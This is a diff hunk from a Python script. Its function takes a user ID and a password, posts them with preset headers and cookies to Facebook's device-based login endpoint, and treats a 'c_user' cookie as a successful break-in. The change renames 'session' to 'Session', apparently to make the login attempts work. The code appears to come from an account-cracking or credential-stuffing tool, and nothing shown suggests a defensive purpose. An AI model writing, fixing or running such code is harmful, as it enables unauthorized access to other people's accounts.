@@ -1387,10 +1387,10 @@ def p(uid,pwx,tl):
             'a': 'AYrzCMozrxxEkLpLMe4Y2HjtqtsmVGwYzrN5JRYYClldhdPtYgFp1Jf_aTSnrZs9GEMJRGEqpBnp7Yr7bbjZFjK5_l3XCV2rjhwTOtu5o4lWwg',
             '_user': '0',}
             url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
-            session.headers.update(headers)
+            Session.headers.update(headers)
             for k, v in cookies.items():
-                session.cookies.set(k, v, domain=".facebook.com")
-            resp = session.post(url, params=params, data=data, allow_redirects=True, timeout=30)
+                Session.cookies.set(k, v, domain=".facebook.com")
+            resp = Session.post(url, params=params, data=data, allow_redirects=True, timeout=30)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
